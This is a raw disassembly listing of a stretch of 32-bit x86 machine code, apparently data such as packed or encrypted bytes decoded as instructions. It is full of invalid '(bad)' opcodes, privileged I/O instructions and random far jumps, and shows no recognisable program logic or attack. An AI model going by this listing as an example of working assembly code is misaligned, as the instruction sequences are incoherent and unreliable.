  413334:	sbb    ecx,DWORD PTR [edi+0x7904d5bf]
  41333a:	addr16 sti 
  41333c:	sbb    DWORD PTR [eax-0x6ba2962d],0x16
  413343:	pop    ebp
  413344:	and    ebp,DWORD PTR [ebp+0x74f5d63]
  41334a:	pop    ebp
  41334b:	ins    DWORD PTR es:[edi],dx
  41334c:	jge    0x413393
  41334e:	cli    
  41334f:	xchg   esp,eax
  413350:	sub    dl,BYTE PTR [edx]
  413352:	jmp    0xdef7:0x4d16a4c5
  413359:	stos   BYTE PTR es:[edi],al
  41335a:	add    dh,dl
  41335c:	ja     0x413305
  41335e:	sbb    esp,DWORD PTR [ebp+0x3249176f]
  413364:	sbb    eax,0xffffff88
  413367:	fwait
  413368:	jl     0x413373
  41336a:	mov    cl,0xac
  41336c:	jo     0x4133b2
  41336e:	add    esi,DWORD PTR [edx+0x47]
  413371:	lods   eax,DWORD PTR ds:[esi]
  413372:	dec    edi
  413373:	aam    0xd0
  413375:	push   ss
  413376:	sbb    eax,0x95f32486
  41337b:	mov    ebp,0xa10623eb
  413380:	jge    0x41334e
  413382:	outs   dx,BYTE PTR ds:[esi]
  413383:	cmc    
  413384:	mov    edi,0xab0df65f
  413389:	sbb    dl,BYTE PTR [ecx+ebp*4]
  41338c:	or     al,0xb0
  41338e:	addr16 jne 0x4133b0
  413391:	pop    esi
  413392:	xor    al,0x75
  413394:	sbb    BYTE PTR [ebp+0x78],ch
  413397:	mov    bh,0x31
  413399:	push   cs
  41339a:	mov    cl,0x59
  41339c:	pop    edi
  41339d:	xor    BYTE PTR [ebx],bh
  41339f:	mov    eax,ds:0xfc7e4004
  4133a4:	imul   cl
  4133a6:	(bad)  
  4133a7:	xor    esp,DWORD PTR [ecx+0x5f]
  4133aa:	xor    edx,ecx
  4133ac:	or     dl,dl
  4133ae:	push   edx
  4133af:	retf   0xa64a
  4133b2:	jo     0x413416
  4133b4:	adc    esp,esp
  4133b6:	xchg   edx,eax
  4133b7:	jnp    0x4133c4
  4133b9:	stos   BYTE PTR es:[edi],al
  4133ba:	pusha  
  4133bb:	mov    eax,DWORD PTR ds:0xa1f58ee8
  4133c1:	xchg   ebx,eax
  4133c2:	scas   al,BYTE PTR es:[edi]
  4133c3:	sahf   
  4133c4:	pop    ebx
  4133c5:	ret    
  4133c6:	mov    dl,0x4d
  4133c8:	sub    dh,BYTE PTR [eax+0x107b4032]
  4133ce:	push   ebp
  4133cf:	inc    edi
  4133d0:	push   esi
  4133d1:	pop    ss
  4133d2:	js     0x413419
  4133d4:	mov    ecx,0x2093aee2
  4133d9:	sbb    al,0x53
  4133db:	xor    al,0xb0
  4133dd:	mov    eax,0xe7825e6f
  4133e2:	div    BYTE PTR [edi-0x37f7dbe9]
  4133e8:	lods   al,BYTE PTR ds:[esi]
  4133e9:	mov    ss,WORD PTR [ecx-0x79d989c5]
  4133ef:	fcom   QWORD PTR [ecx+esi*2+0x72d023c8]
  4133f6:	lock sbb al,0x9d
  4133f9:	jl     0x4133dd
  4133fb:	loop   0x41340b
  4133fd:	mov    ebx,0x205734d5
  413402:	cmp    BYTE PTR [edx+eax*2+0x74],ah
  413406:	aas    
  413407:	in     al,dx
  413408:	inc    ecx
  413409:	cmp    ch,BYTE PTR [edi]
  41340b:	dec    edx
  41340c:	mov    al,ds:0x5f744cca
  413411:	or     esi,eax
  413413:	and    al,0x7c
  413415:	push   ebp
  413416:	bound  ebx,QWORD PTR [ecx-0x25433374]
  41341c:	out    dx,al
  41341d:	add    dh,dh
  41341f:	push   es
  413420:	push   eax
  413421:	mov    ah,0xef
  413423:	mov    ebp,0x7fcb589a
  413428:	ret    0xd383
  41342b:	or     eax,DWORD PTR [esi-0x4a]
  41342e:	push   0xffffffc6
  413430:	mov    eax,0x9bc83256
  413435:	jl     0x4134a5
  413437:	sbb    dl,0x9d
  41343a:	and    dh,BYTE PTR [edx]
  41343c:	or     dh,bh
  41343e:	js     0x4133f0
  413440:	add    dl,BYTE PTR [ebx-0x62]
  413443:	leave  
  413444:	add    bh,BYTE PTR [edi]
  413446:	jge    0x413422
  413448:	xor    DWORD PTR [ecx],edi
  41344a:	and    DWORD PTR [edx],esi
  41344c:	pop    edi
  41344d:	ret    
  41344e:	inc    ebp
  41344f:	repz repnz pop ecx
  413452:	call   0x3fc8:0x9767547b
  413459:	test   al,0x99
  41345b:	ja     0x413485
  41345d:	xor    al,0xc6
  41345f:	and    al,BYTE PTR [ecx-0x66]
  413462:	rcl    DWORD PTR [edi+0x37],cl
  413465:	add    eax,DWORD PTR [eax]
  413467:	adc    BYTE PTR ds:0xb6f908a4,0x9c
  41346e:	test   eax,0x3e7055db
  413473:	stos   BYTE PTR es:[edi],al
  413474:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413475:	mov    bh,BYTE PTR [ecx-0x4822f16e]
  41347b:	in     eax,dx
  41347c:	xor    ah,BYTE PTR [edx]
  41347e:	fstp   TBYTE PTR [ecx+ebp*4+0x29]
  413482:	dec    ecx
  413483:	fld    TBYTE PTR [edi]
  413485:	inc    esp
  413486:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413487:	and    al,0x0
  41348a:	jnp    0x4134b2
  41348c:	ror    BYTE PTR [ecx],0x16
  41348f:	rcl    DWORD PTR [ebp+0x4],0x25
  413493:	or     bh,0xa
  413496:	retf   
  413497:	pop    ecx
  413498:	call   0xfb8569f3
  41349d:	mov    fs,WORD PTR [edx]
  41349f:	clc    
  4134a0:	pop    ecx
  4134a1:	fdivr  DWORD PTR [ecx+edi*2]
  4134a4:	(bad)  
  4134a6:	push   0xffffffd7
  4134a8:	mov    WORD PTR [edx-0x66be1181],?
  4134ae:	fst    DWORD PTR [ebp+0x4c]
  4134b1:	and    al,BYTE PTR [eax]
  4134b3:	jb     0x4134aa
  4134b5:	test   al,0x76
  4134b7:	mov    ch,0x4f
  4134b9:	dec    esi
  4134ba:	mov    edi,gs
  4134bc:	push   cs
  4134bd:	retf   
  4134be:	and    DWORD PTR [ebx-0x2faa4e36],ecx
  4134c4:	pop    ebp
  4134c5:	push   eax
  4134c6:	out    dx,eax
  4134c7:	std    
  4134c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134c9:	in     eax,dx
  4134ca:	jl     0x413470
  4134cc:	rol    DWORD PTR [edi],1
  4134ce:	mov    cl,0xf3
  4134d0:	mov    ch,0xc3
  4134d2:	and    BYTE PTR [edx-0x5a4e733d],ch
  4134d8:	test   al,0x56
  4134da:	sub    bh,bh
  4134dc:	jle    0x41352f
  4134de:	lods   al,BYTE PTR ds:[esi]
  4134df:	pop    edi
  4134e0:	sub    ecx,esp
  4134e2:	(bad)  
  4134e3:	xchg   ebp,eax
  4134e4:	gs aad 0xf3
  4134e7:	mov    eax,0x1662984f
  4134ec:	mov    ch,0x70
  4134ee:	ins    BYTE PTR es:[edi],dx
  4134ef:	pop    ds
  4134f0:	sbb    esi,DWORD PTR [edx]
  4134f2:	xchg   esp,eax
  4134f3:	aad    0xc6
  4134f5:	mov    al,0x3d
  4134f7:	es or  al,0xd
  4134fa:	ss mov al,0xc4
  4134fd:	imul   esp,DWORD PTR [edi-0x62d531aa],0xffffffaa
  413504:	inc    ebp
  413505:	js     0x413527
  413507:	outs   dx,DWORD PTR ds:[esi]
  413508:	shl    DWORD PTR [ebx+0x725aaf87],cl
  41350e:	dec    esi
  41350f:	jns    0x413574
  413511:	outs   dx,DWORD PTR ds:[esi]
  413512:	xchg   esi,eax
  413513:	mov    eax,ds:0xe2f94eb3
  413518:	rol    BYTE PTR [esi],0xf
  41351b:	and    DWORD PTR [ecx],ebx
  41351d:	adc    dh,0xb2
  413520:	leave  
  413521:	mov    bh,0x9a
  413523:	out    0xc9,al
  413525:	push   esp
  413526:	scas   eax,DWORD PTR es:[edi]
  413527:	out    0xef,eax
  413529:	sub    al,0xf
  41352b:	or     BYTE PTR [edx+edx*8-0x2c84cc61],dl
  413532:	jmp    0x7d409a81
  413537:	ret    0x8f29
  41353a:	mov    ebp,0xa95f7401
  41353f:	loop   0x413587
  413541:	(bad)  
  413542:	(bad)  
  413543:	out    dx,eax
  413544:	xor    edi,DWORD PTR [edi-0x16]
  413547:	sub    bh,BYTE PTR [edi+0x1e9b5102]
  41354d:	adc    eax,0x1ff3ae23
  413552:	cmp    al,0x60
  413554:	int    0xe4
  413556:	and    eax,0x267a6dcc
  41355b:	mul    dh
  41355d:	fiadd  DWORD PTR [ebx+ecx*4+0x4be720c8]
  413564:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413565:	in     eax,dx
  413566:	sub    bl,0x1d
  413569:	cmp    al,0xb3
  41356b:	in     eax,0x83
  41356d:	mov    edi,0xa6cfd1b3
  413572:	jp     0x413568
  413574:	sbb    eax,0x3f09a88f
  413579:	dec    esp
  41357a:	enter  0xc4e4,0x9
  41357e:	cwde   
  41357f:	cmp    eax,0xcea86590
  413584:	mov    dh,0x18
  413586:	test   ebp,0x1d7edf00
  41358c:	inc    edx
  41358d:	mov    bh,0x1c
  41358f:	xchg   edx,eax
  413590:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413591:	mov    ds:0x9ffca3da,al
  413596:	jge    0x413559
  413598:	mov    esp,0x1ea0db51
  41359d:	or     bh,ah
  41359f:	jnp    0x4135d6
  4135a1:	out    dx,al
  4135a2:	and    al,0xaf
  4135a4:	dec    esp
  4135a5:	fsubp  st(4),st
  4135a7:	and    BYTE PTR [esi-0x6a],bl
  4135aa:	stos   BYTE PTR es:[edi],al
  4135ab:	mov    DWORD PTR [eax-0x15],edi
  4135ae:	pop    eax
  4135af:	aas    
  4135b0:	fcmovb st,st(1)
  4135b2:	inc    ecx
  4135b3:	gs and eax,0xcd02e1b
  4135b9:	dec    ebx
  4135ba:	adc    cl,BYTE PTR [edi+edx*1-0x7f]
  4135be:	jmp    0x5985:0x7bfee549
  4135c5:	je     0x413639
  4135c7:	(bad)  
  4135c8:	xor    eax,0xf965c1c1
  4135cd:	push   ss
  4135ce:	cmp    DWORD PTR [ebp+0x31c8ed56],0x6877b8f7
  4135d8:	inc    ecx
  4135d9:	push   cs
  4135da:	pop    ebp
  4135db:	mov    al,0x7c
  4135dd:	xchg   ebp,eax
  4135de:	cmp    eax,0x319682cf
  4135e3:	mov    ebx,0x4f64787c
  4135e8:	adc    edx,edi
  4135ea:	xor    al,BYTE PTR [ebx+0x74]
  4135ed:	loope  0x413635
  4135ef:	sub    BYTE PTR [ecx-0x14],dh
  4135f2:	jae    0x4135ba
  4135f4:	(bad)  
  4135f5:	jnp    0x41359b
  4135f7:	inc    ebx
  4135f8:	sbb    DWORD PTR [eax+0x289e2c30],eax
  4135fe:	add    eax,0x4198f5c1
  413603:	hlt    
  413604:	sub    eax,0x372fba5f
  413609:	repnz fcmovnu st,st(5)
  41360c:	call   0xd88b22d9
  413611:	das    
  413612:	mov    ecx,0xbd959a2b
  413617:	clc    
  413618:	jo     0x413668
  41361a:	shl    DWORD PTR [edi+0x1e],0x94
  41361e:	fild   WORD PTR [esi-0x5b]
  413621:	ins    BYTE PTR es:[edi],dx
  413622:	popa   
  413623:	into   
  413624:	stos   BYTE PTR es:[edi],al
  413625:	icebp  
  413626:	pop    eax
  413627:	data16 or BYTE PTR [eax],dl
  41362a:	call   0x3458:0xf7560c88
  413631:	push   eax
  413632:	mov    esp,0x5ce42853
  413637:	sub    ebp,ecx
  413639:	(bad)  
  41363a:	pop    esi
  41363b:	ins    BYTE PTR es:[edi],dx
  41363c:	pop    ebx
  41363d:	shl    BYTE PTR [esi],0x4e
  413640:	mov    dh,0x13
  413642:	add    al,BYTE PTR [ebp-0x96a723d]
  413648:	popa   
  413649:	xchg   ebx,eax
  41364a:	mov    ebp,0xcb2f8e09
  41364f:	bound  esp,QWORD PTR [esi+esi*4-0x47]
  413653:	mov    bl,BYTE PTR [eax-0x45]
  413656:	jbe    0x413626
  413658:	repnz scas eax,DWORD PTR es:[edi]
  41365a:	outs   dx,DWORD PTR ds:[esi]
  41365b:	cdq    
  41365c:	or     ah,al
  41365e:	mov    ah,0xb7
  413660:	aaa    
  413661:	pop    edi
  413662:	and    BYTE PTR [ebp+0x6e58f90b],dl
  413668:	push   esi
  413669:	jge    0x4136ce
  41366b:	push   esp
  41366c:	mov    ecx,0x7d8b8a6f
  413671:	imul   ebp,eax,0x71da591b
  413677:	or     BYTE PTR [edi+ecx*8+0x4f],bl
  41367b:	sbb    BYTE PTR [ebp+0x4f],bl
  41367e:	inc    ecx
  41367f:	mov    ebx,0xebd0f6c8
  413684:	mov    BYTE PTR [edx+esi*1+0x5b40e921],dh
  41368b:	outs   dx,BYTE PTR ds:[esi]
  41368c:	ins    BYTE PTR es:[edi],dx
  41368d:	xor    esp,DWORD PTR [edx+0x6]
  413690:	jmp    0x257:0x5ec69ad0
  413697:	ficomp WORD PTR [esi]
  413699:	mov    eax,0x3a9cc63d
  41369e:	ss ds mov ebx,0x149fb12e
  4136a5:	loope  0x413655
  4136a7:	pushf  
  4136a8:	shl    DWORD PTR [ebp-0x141d695f],1
  4136ae:	in     al,dx
  4136af:	mov    ds:0x5efdc1a2,al
  4136b4:	sbb    edx,DWORD PTR ds:0x8feda59d
  4136ba:	aaa    
  4136bb:	sub    BYTE PTR [edi],0x1a
  4136be:	sahf   
  4136bf:	mov    bl,0xa9
  4136c1:	arpl   WORD PTR ds:0x908a0671,cx
  4136c7:	pop    edi
  4136c8:	adc    DWORD PTR [ecx],edi
  4136ca:	and    eax,0xc2019a6c
  4136cf:	and    DWORD PTR [ecx+0x22dddee2],0xcafd94f0
  4136d9:	push   edi
  4136da:	adc    edi,DWORD PTR [ebx+0xb]
  4136dd:	mov    WORD PTR [esi+0x58d1db14],ss
  4136e3:	pusha  
  4136e4:	and    al,0xd0
  4136e6:	mov    ds:0x3f8f5d14,eax
  4136eb:	xor    ah,BYTE PTR [esi]
  4136ed:	fsubr  QWORD PTR [esi+0x71]
  4136f0:	mov    edi,0xf8110b83
  4136f5:	xchg   BYTE PTR [ebx-0x1378417a],dl
  4136fb:	pushfw 
  4136fd:	fld    st(2)
  4136ff:	(bad)  
  413701:	lock addr16 mov cl,0xff
  413705:	xor    ebp,DWORD PTR [ecx+0x7]
  413708:	add    al,al
  41370a:	call   0xcd92ebfc
  41370f:	inc    ecx
  413710:	cmp    eax,0xdcee0f72
  413715:	test   al,0xd
  413717:	sar    BYTE PTR [ebx+ebp*1+0x24ef965d],0x11
  41371f:	jae    0x413727
  413721:	test   BYTE PTR [edx+eax*1-0x56dd0f7d],ch
  413728:	add    ah,dh
  41372a:	mov    ds:0x4f5159c4,al
  41372f:	shl    DWORD PTR [ecx],0x87
  413732:	scas   al,BYTE PTR es:[edi]
  413733:	mov    ebx,eax
  413735:	call   0x6896f280
  41373a:	cmp    dh,dl
  41373c:	jnp    0x413756
  41373e:	retf   0x93a4
  413741:	sbb    ecx,esi
  413743:	ja     0x4136d8
  413745:	cmp    al,0x98
  413747:	push   ds
  413748:	xchg   esp,eax
  413749:	push   ebx
  41374a:	mov    bl,0x4f
  41374c:	jle    0x4136e4
  41374e:	pop    ebx
  41374f:	mov    ecx,cs
  413751:	dec    edx
  413752:	mov    DWORD PTR [edi],eax
  413754:	mov    ?,WORD PTR [ecx-0x5faaf4f4]
  41375a:	aad    0xb1
  41375c:	inc    edi
  41375d:	dec    ebp
  41375e:	pop    ebp
  41375f:	xchg   esp,eax
  413760:	cmp    eax,0xdeed9330
  413765:	xchg   edx,eax
  413766:	lahf   
  413767:	adc    ecx,edx
  413769:	xchg   ebx,eax
  41376a:	imul   ecx,DWORD PTR [ebp+0x4af1365e],0x2800a53
  413774:	xchg   DWORD PTR [eax-0x2a],ebx
  413777:	sahf   
  413778:	in     eax,0xb
  41377a:	xor    eax,0x756d60b5
  41377f:	ss jae 0x41377d
  413782:	xchg   edx,eax
  413783:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413784:	jns    0x4137b3
  413786:	sar    ecx,0x6d
  413789:	clc    
  41378a:	jb     0x41373b
  41378c:	aad    0x28
  41378e:	cmp    eax,0x93e71ece
  413793:	mov    bh,0x61
  413795:	pushf  
  413796:	out    0xd2,eax
  413798:	cld    
  413799:	aam    0xec
  41379b:	xor    ebp,DWORD PTR [esi-0x5d3ab8f9]
  4137a1:	fdiv   st(0),st
  4137a3:	jnp    0x413773
  4137a5:	rcr    BYTE PTR [edi+eax*1],1
  4137a8:	rcl    BYTE PTR [ebp-0xdb0a6],0x50
  4137af:	or     eax,0x55a9a500
  4137b4:	fst    QWORD PTR [edi]
  4137b6:	fidivr DWORD PTR ds:0x8d80f359
  4137bc:	pop    ecx
  4137bd:	sbb    eax,0x43c782b0
  4137c2:	cdq    
  4137c3:	dec    eax
  4137c4:	aaa    
  4137c5:	js     0x4137c5
  4137c7:	jo     0x4137a8
  4137c9:	push   0x70b20524
  4137ce:	scas   eax,DWORD PTR es:[edi]
  4137cf:	xor    esp,eax
  4137d1:	lods   al,BYTE PTR ds:[esi]
  4137d2:	in     eax,dx
  4137d3:	push   edi
  4137d4:	pop    edx
  4137d5:	out    dx,al
  4137d6:	jmp    0xebce:0xff49609b
  4137dd:	mov    bh,0xc4
  4137df:	cmp    DWORD PTR [eax+0x56f15983],edi
  4137e5:	sub    BYTE PTR [ecx],0x8
  4137e8:	loopne 0x41385b
  4137ea:	not    BYTE PTR [esi]
  4137ec:	push   esp
  4137ed:	fcmovb st,st(1)
  4137ef:	push   ebp
  4137f0:	dec    BYTE PTR [edi-0x20]
  4137f3:	test   eax,0x83fae204
  4137f8:	stos   BYTE PTR es:[edi],al
  4137f9:	repz scas eax,DWORD PTR es:[edi]
  4137fb:	push   ebp
  4137fc:	mov    ds:0x60e25a5f,eax
  413801:	rcr    DWORD PTR [eax+0x76],cl
  413804:	inc    esp
  413805:	mov    ebp,0x6d4884df
  41380a:	mov    cl,0x93
  41380c:	push   ss
  41380d:	mov    bl,0xf2
  41380f:	test   BYTE PTR [ecx+eax*2+0x5ef77a28],bl
  413816:	xor    al,0xdc
  413818:	mov    ebp,0x9af71906
  41381d:	or     eax,0xe5eba39e
  413822:	xor    BYTE PTR [eax+0x7c],dh
  413825:	ja     0x413858
  413827:	mov    ch,0x76
  413829:	adc    ebx,DWORD PTR [esi-0x66036589]
  41382f:	aam    0xef
  413831:	jp     0x4137ce
  413833:	mov    bh,0xaf
  413835:	sub    dl,0x88
  413838:	out    0x13,eax
  41383a:	scas   al,BYTE PTR es:[edi]
  41383b:	adc    al,0x54
  41383d:	popa   
  41383e:	in     al,dx
  41383f:	sub    eax,0x395d5898
  413845:	jmp    0x5b8d437b
  41384a:	xor    bh,BYTE PTR [edi+edi*8]
  41384d:	enter  0xa401,0xe1
  413851:	shl    DWORD PTR [edx],cl
  413853:	push   es
  413854:	push   esp
  413855:	rcl    BYTE PTR [edx-0x2d056858],1
  41385b:	std    
  41385c:	push   0xfffffff7
  41385e:	xor    DWORD PTR [esi+0x7a],ecx
  413861:	mov    ah,dh
  413863:	xor    dl,dl
  413865:	std    
  413866:	add    eax,0x5d5e3506
  41386b:	(bad)  
  41386c:	sar    DWORD PTR [ebx-0x583acb1f],0x7f
  413873:	mov    esi,0x286ec7e1
  413878:	pop    edx
  413879:	push   edi
  41387a:	inc    ebp
  41387b:	add    ebx,esi
  41387d:	outs   dx,DWORD PTR ds:[esi]
  41387e:	fcomip st,st(1)
  413880:	mov    ds:0x53ddda37,eax
  413885:	imul   ebx,DWORD PTR [edx+0xe],0xc606ba26
  41388c:	pop    ds
  41388d:	jle    0x4138f3
  41388f:	ds ret 0x59b7
  413893:	inc    edi
  413894:	dec    edx
  413895:	nop    esp
  413898:	fcomi  st,st(2)
  41389a:	mov    ebx,0x22c553a4
  41389f:	loop   0x4138f5
  4138a1:	inc    esp
  4138a2:	in     al,dx
  4138a3:	aad    0x2d
  4138a5:	out    dx,al
  4138a6:	xchg   esp,eax
  4138a7:	mov    edx,0x49a78abf
  4138ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138ad:	push   edi
  4138ae:	inc    esi
  4138af:	add    DWORD PTR [esi],esp
  4138b1:	xchg   BYTE PTR [edx-0x31],cl
  4138b4:	lods   al,BYTE PTR ds:[esi]
  4138b5:	xchg   ebp,eax
  4138b6:	sti    
  4138b7:	mov    bl,0xa4
  4138b9:	aas    
  4138ba:	adc    cx,WORD PTR [esi+esi*8-0x568463e2]
  4138c2:	lock in eax,dx
  4138c4:	enter  0xf4c9,0x50
  4138c8:	cmp    al,0x6f
  4138ca:	sbb    eax,0x422d5745
  4138cf:	aam    0xa3
  4138d1:	sbb    al,0xaf
  4138d3:	mov    ebx,0x19bd2ed9
  4138d8:	xor    DWORD PTR [eax],ecx
  4138da:	mov    DWORD PTR [ebx],edi
  4138dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138dd:	jbe    0x41394c
  4138df:	mov    ebp,0x54b03750
  4138e4:	imul   ebx,esi,0xfa6bb3b8
  4138ea:	retf   0xe326
  4138ed:	xor    ebp,DWORD PTR [edi+ecx*1]
  4138f0:	add    al,0xf4
  4138f2:	iret   
  4138f3:	out    0x4c,al
  4138f5:	aam    0xdc
  4138f7:	xor    BYTE PTR [eax],dl
  4138f9:	cdq    
  4138fa:	dec    ebp
  4138fb:	lds    eax,FWORD PTR [ecx+edx*4+0x5ae592df]
  413902:	jno    0x41389e
  413904:	retf   
  413905:	dec    esp
  413906:	ret    
  413907:	inc    eax
  413908:	and    al,0xbb
  41390a:	xchg   ebp,eax
  41390b:	lock stos DWORD PTR es:[edi],eax
  41390d:	xor    dl,BYTE PTR [ecx]
  41390f:	push   ss
  413910:	jmp    0xda4c:0xf8dfa1bd
  413917:	test   DWORD PTR [ebx+0x79a6f566],ebp
  41391d:	out    dx,al
  41391e:	mov    al,0x6f
  413920:	rcr    BYTE PTR [eax-0x51],cl
  413923:	dec    ebp
  413924:	lods   eax,DWORD PTR ds:[esi]
  413925:	xchg   edx,eax
  413926:	sub    cl,BYTE PTR [edx-0x71e20867]
  41392c:	test   BYTE PTR [eax],cl
  41392e:	sbb    eax,0x83375df3
  413933:	sub    esi,DWORD PTR [eax+0x71]
  413936:	pop    ebp
  413937:	jle    0x4139a8
  413939:	(bad)  
  41393a:	aam    0x6f
  41393c:	adc    esp,edx
  41393e:	not    DWORD PTR [ebx-0xd1b792c]
  413944:	daa    
  413945:	inc    DWORD PTR [edx+0x5a]
  413948:	popa   
  413949:	rcl    bh,cl
  41394b:	(bad)  
  41394c:	retf   
  41394d:	jne    0x41395c
  41394f:	retf   
  413950:	daa    
  413951:	xor    bl,BYTE PTR [eax]
  413953:	mov    ah,0x61
  413955:	out    0x47,eax
  413957:	aad    0x7e
  413959:	fisttp DWORD PTR [edx+0x186d80f2]
  41395f:	dec    edx
  413960:	stc    
  413961:	pop    ecx
  413962:	or     ebp,DWORD PTR [ecx]
  413964:	jne    0x413957
  413966:	leave  
  413967:	bt     DWORD PTR [edx+0x3],ecx
  41396b:	add    edx,DWORD PTR [edi+ebp*4]
  41396e:	clc    
  41396f:	mov    dl,0x3c
  413971:	mov    WORD PTR [eax+edx*8],ss
  413974:	popa   
  413975:	popa   
  413976:	mov    eax,0x87fcb14d
  41397b:	pop    ebp
  41397c:	repz adc al,0x7a
  41397f:	cmc    
  413980:	jmp    0xf488:0xa5a786f
  413987:	in     eax,0xd2
  413989:	sub    al,0x2e
  41398b:	mov    ah,0xda
  41398d:	loopne 0x4139e9
  41398f:	js     0x4139e7
  413991:	and    al,0x6
  413993:	(bad)  
  413994:	std    
  413995:	in     eax,dx
  413996:	scas   al,BYTE PTR es:[edi]
  413997:	dec    edx
  413998:	sub    ebp,DWORD PTR [ebx+0x23a39b7d]
  41399e:	mov    bh,ch
  4139a0:	xchg   edx,esi
  4139a2:	arpl   WORD PTR [ebx+0xaaf2cbc],si
  4139a8:	call   DWORD PTR [edx-0x58]
  4139ab:	sub    edx,DWORD PTR [edi-0x2509a208]
  4139b1:	hlt    
  4139b2:	int    0x44
  4139b4:	mov    eax,ds:0x9f290ff4
  4139b9:	mov    esi,0x90addc4c
  4139be:	ins    DWORD PTR es:[edi],dx
  4139bf:	cmc    
  4139c0:	jmp    DWORD PTR [edx+0xe]
  4139c3:	pop    ebx
  4139c4:	stos   DWORD PTR es:[edi],eax
  4139c5:	es sub eax,0x8c9ee02e
  4139cb:	enter  0xed5d,0xae
  4139cf:	ins    DWORD PTR es:[edi],dx
  4139d0:	pop    edx
  4139d1:	pushf  
  4139d2:	ja     0x4139f1
  4139d4:	jo     0x413978
  4139d6:	xchg   edx,eax
  4139d7:	pop    ss
  4139d8:	push   eax
  4139d9:	xor    BYTE PTR [ebp+0x3a],bh
  4139dc:	aam    0x79
  4139de:	dec    ebx
  4139df:	push   ebx
  4139e0:	sub    BYTE PTR [edi-0x74],dl
  4139e3:	inc    edx
  4139e4:	push   cs
  4139e5:	stc    
  4139e6:	pop    ss
  4139e7:	jecxz  0x41398a
  4139e9:	hlt    
  4139ea:	xchg   DWORD PTR [edi],edx
  4139ec:	cmc    
  4139ed:	pop    ds
  4139ee:	hlt    
  4139ef:	pop    eax
  4139f0:	je     0x413a49
  4139f2:	mov    bl,0x64
  4139f4:	jmp    0x413a3c
  4139f6:	add    edx,DWORD PTR [ebx]
  4139f8:	lods   eax,DWORD PTR ds:[esi]
  4139f9:	int3   
  4139fa:	icebp  
  4139fb:	jnp    0x413a33
  4139fd:	ret    0xc4af
  413a00:	(bad)  
  413a01:	or     BYTE PTR [edx-0xf],al
  413a04:	or     al,0x9c
  413a06:	lock icebp 
  413a08:	imul   ecx,DWORD PTR [eax+0x53],0xfa9fb605
  413a0f:	jnp    0x413a5e
  413a11:	and    DWORD PTR [ebx-0x245c5e89],ebp
  413a17:	push   ss
  413a18:	leave  
  413a19:	sub    BYTE PTR [esi],dl
  413a1b:	outs   dx,DWORD PTR ds:[esi]
  413a1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a1d:	ror    BYTE PTR [eax],cl
  413a1f:	xor    eax,0xc2a1f22a
  413a24:	arpl   cx,si
  413a26:	loop   0x4139e2
  413a28:	out    dx,al
  413a29:	fwait
  413a2a:	mov    ebp,0x8572a569
  413a2f:	ins    DWORD PTR es:[edi],dx
  413a30:	push   es
  413a31:	sar    DWORD PTR [esi+edi*2],1
  413a34:	pop    DWORD PTR [ebx+0xd570350]
  413a3a:	outs   dx,DWORD PTR ds:[esi]
  413a3b:	out    0x2f,eax
  413a3d:	fild   QWORD PTR [ebx]
  413a3f:	es xchg ebx,eax
  413a41:	out    dx,al
  413a42:	test   DWORD PTR [eax],edi
  413a44:	pop    edx
  413a45:	adc    ah,ch
  413a47:	(bad)  
  413a48:	adc    ebp,DWORD PTR [edi-0x43]
  413a4b:	outs   dx,BYTE PTR ds:[esi]
  413a4c:	or     dh,BYTE PTR [esi+0x49]
  413a4f:	pop    esp
  413a50:	ret    0xae4c
  413a53:	add    ebx,0xa4de069b
  413a59:	rcr    DWORD PTR [eax-0x6e],1
  413a5c:	jnp    0x4139f0
  413a5e:	mov    eax,ds:0x70479ebf
  413a63:	adc    BYTE PTR [ecx+0x7d2e7ee4],dh
  413a69:	pop    esp
  413a6a:	pop    edx
  413a6b:	and    eax,0x4751df1a
  413a70:	std    
  413a71:	sub    ch,cl
  413a73:	leave  
  413a74:	scas   al,BYTE PTR es:[edi]
  413a75:	sub    al,0xd2
  413a77:	daa    
  413a78:	mov    ah,0x4b
  413a7a:	scas   eax,DWORD PTR es:[edi]
  413a7b:	jb     0x413a32
  413a7d:	repnz sbb DWORD PTR [esp+ebx*2+0x5c886a33],ebp
  413a85:	inc    ebx
  413a86:	fwait
  413a87:	mov    cl,0x69
  413a89:	sbb    esp,DWORD PTR [ecx]
  413a8b:	loope  0x413a22
  413a8d:	cmp    ah,BYTE PTR [ebx]
  413a8f:	stos   DWORD PTR es:[edi],eax
  413a90:	xor    dl,bl
  413a92:	push   ebp
  413a93:	pop    edi
  413a94:	mov    al,0x2e
  413a96:	test   bh,al
  413a98:	cmp    ebp,DWORD PTR [ebx]
  413a9a:	loop   0x413a94
  413a9c:	clc    
  413a9d:	mov    eax,ds:0x64e8732f
  413aa2:	call   0xe24d:0xc52bf199
  413aa9:	pop    ebp
  413aaa:	jno    0x413af8
  413aac:	cmp    bh,BYTE PTR [ebx-0x66]
  413aaf:	and    DWORD PTR [ebx-0x3d98432],edi
  413ab5:	leave  
  413ab6:	add    eax,0xac08df54
  413abb:	int3   
  413abc:	stc    
  413abd:	jb     0x413add
  413abf:	es xchg edx,eax
  413ac1:	push   eax
  413ac2:	mov    ecx,0xbbbb0950
  413ac7:	pop    ebx
  413ac8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ac9:	dec    edx
  413aca:	push   0xffffffaa
  413acc:	sbb    al,0xcd
  413ace:	xor    eax,DWORD PTR [edi]
  413ad0:	xor    al,ah
  413ad2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ad3:	adc    DWORD PTR [ebx-0x687120e],ebx
  413ad9:	jmp    0x9858:0x1f426df5
  413ae0:	mov    edi,0x93900f4e
  413ae5:	sbb    al,0x5d
  413ae7:	push   eax
  413ae8:	sbb    eax,0x6e307a00
  413aed:	inc    ebp
  413aee:	jp     0x413b0c
  413af0:	and    ebp,esi
  413af2:	int    0xf8
  413af4:	cmc    
  413af5:	jbe    0x413b09
  413af7:	mov    dl,bl
  413af9:	xor    eax,0xdac8e5a4
  413afe:	(bad)  
  413aff:	and    cl,BYTE PTR [ecx+0x332a9414]
  413b05:	mov    WORD PTR [ebx-0x48],ds
  413b08:	popa   
